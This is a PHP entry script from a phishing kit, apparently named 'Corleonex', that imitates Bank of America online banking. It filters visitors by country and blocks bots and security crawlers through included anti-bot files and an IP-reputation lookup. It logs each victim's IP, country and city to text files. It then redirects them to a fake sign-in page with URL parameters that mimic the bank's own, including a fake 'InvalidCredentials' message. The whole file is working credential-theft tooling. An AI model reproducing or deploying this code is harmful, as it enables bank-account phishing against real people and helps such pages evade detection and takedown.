<?php
session_start();



include'Corleonex/config.php';
include'Corleonex/Anti/IP-BlackList.php';  
include'Corleonex/Anti/Bot-Crawler.php';
include'Corleonex/Anti/bot-corleonex.php';
include'Corleonex/Anti/blacklist.php';
include'Corleonex/Anti/new.php';
include'Corleonex/Functions/Fuck-you.php'; 
include'Corleonex/Anti/Dila_DZ.php';




  if ($allow_country=="yes") {
	if ($_SESSION['countrycode']=='US' || $_SESSION['countrycode']=='ES' || $_SESSION['countrycode']=='DZ' || $_SESSION['countrycode']=='GB' || $_SESSION['countrycode']=='CA' || $_SESSION['countrycode']=='DE' || $_SESSION['countrycode']=='IN') {	  
	   }else{
	   	exit(header("Location: 404"));
	   }
	  }
if ($user[0]['installed'] == "yes") {
  

} else {
 

  header('Location: admin/install.php');
  exit;

}

$CHASE_SESSION_CORLEONEX = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));


if ($corleonex_protection=="yes") {

		$ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://api.iptrooper.net/check/".$_SESSION['ip']."?full=1");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);

				$check = trim(strip_tags(get_string_between($json,'"bad":',',"')));
				$type = trim(strip_tags(get_string_between($json,'"type":"','"')));

			$key = substr(sha1(mt_rand()),1,25);
			
			if ($anti_bot=="yes") { if ($check == "true") {	
			$content = "#>".$_SESSION['ip']." [ ".$type." ] - [ ".$_SESSION['country']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();

			}
			} 

			$content = "#>".$_SESSION['ip']." [ ".$_SESSION['country']." ] - [ ".$_SESSION['city']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("visit_log.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			$_SESSION['BOA_CORLEONEX'] = $CHASE_SESSION_CORLEONEX;
			exit(header("Location: login?boa_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."" . "&signOnV2Screen.go?msg=InvalidCredentials_2_Remaining&request_locale=en_us&lpOlbResetErrorCounter=0"));
		
				

	}else{
			$content = "#>".$_SESSION['ip']." [ ".$_SESSION['country']." ] - [ ".$_SESSION['city']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("visit_log.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			$_SESSION['BOA_CORLEONEX'] = $CHASE_SESSION_CORLEONEX;
			exit(header("Location: login?boa_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."" . "&signOnV2Screen.go?msg=InvalidCredentials_2_Remaining&request_locale=en_us&lpOlbResetErrorCounter=0"));
	}

?>

